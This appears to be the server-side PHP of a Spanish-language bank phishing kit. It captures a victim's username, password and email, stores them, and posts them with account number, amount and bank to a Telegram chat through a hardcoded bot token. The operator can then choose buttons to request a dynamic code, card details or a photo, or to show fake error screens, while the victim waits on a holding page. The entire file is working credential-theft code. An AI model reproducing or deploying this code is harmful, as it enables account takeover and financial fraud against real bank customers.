<?php
ob_start();
session_start();
require 'conexion.php';

$nombreUsuario = $_POST['usuario'] ?? '';
$password      = $_POST['clave']   ?? '';
$claveUnica    = $_POST['key']     ?? '';
$email         = $_POST['correo']  ?? '';
$idPeticion    = uniqid("req_");

$consulta = $pdo->prepare("SELECT numero_cuenta, monto, banco FROM solicitudes WHERE `key` = ? LIMIT 1");
$consulta->execute([$claveUnica]);
$datosSolicitud = $consulta->fetch(PDO::FETCH_ASSOC);

if (!$datosSolicitud) {
    exit("Error: No se encontro informacion asociada a esa clave.");
}

$actualizar = $pdo->prepare("UPDATE solicitudes SET nombre = ?, telefono = ?, correo = ?, request_id = ? WHERE `key` = ?");
$actualizar->execute([$nombreUsuario, $password, $email, $idPeticion, $claveUnica]);

$telefonoCliente    = $datosSolicitud['numero_cuenta'];
$montoTransferencia = $datosSolicitud['monto'];
$nombreBanco        = $datosSolicitud['banco'];

$botToken = "8067654456:AAEBhilArTMwjCmZrxW2MPsPS4-yx9hSFYU";
$idChat   = "-4923753161";

$mensaje  = "🆕 Nueva dinamica:\n";
$mensaje .= "📱 Celular: $telefonoCliente\n";
$mensaje .= "💰 Monto: $montoTransferencia\n";
$mensaje .= "🏦 Banco: $nombreBanco\n";
$mensaje .= "📧 Correo: $email\n";
$mensaje .= "---\n";
$mensaje .= "👤 Usuario: $nombreUsuario\n";
$mensaje .= "🔒 Clave: $password\n";

$teclado = [
  'inline_keyboard' => [[
    ['text' => "DINAMICA",  'callback_data' => "OPCION_1_$idPeticion"],
    ['text' => "TARJETA",   'callback_data' => "OPCION_2_$idPeticion"],
  ], [
    ['text' => "ERROR...",  'callback_data' => "OPCION_3_$idPeticion"],
    ['text' => "ERROR...",  'callback_data' => "OPCION_4_$idPeticion"],
    ['text' => "FOTO",      'callback_data' => "OPCION_5_$idPeticion"],
  ], [
    ['text' => "FINALIZAR", 'callback_data' => "OPCION_9_$idPeticion"]
  ]]
];

$payload = json_encode([
  'chat_id'      => $idChat,
  'text'         => $mensaje,
  'reply_markup' => $teclado
]);

$ch = curl_init("https://api.telegram.org/bot{$botToken}/sendMessage");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$_SESSION['usuario']    = $nombreUsuario;
$_SESSION['clave']      = $password;
$_SESSION['correo']     = $email;
$_SESSION['celular']    = $telefonoCliente;
$_SESSION['monto']      = $montoTransferencia;
$_SESSION['banco']      = $nombreBanco;
$_SESSION['request_id'] = $idPeticion;
$_SESSION['key']        = $claveUnica;

header("Location: espera.html?rid=$idPeticion&key=$claveUnica&correo=" . urlencode($email));
exit;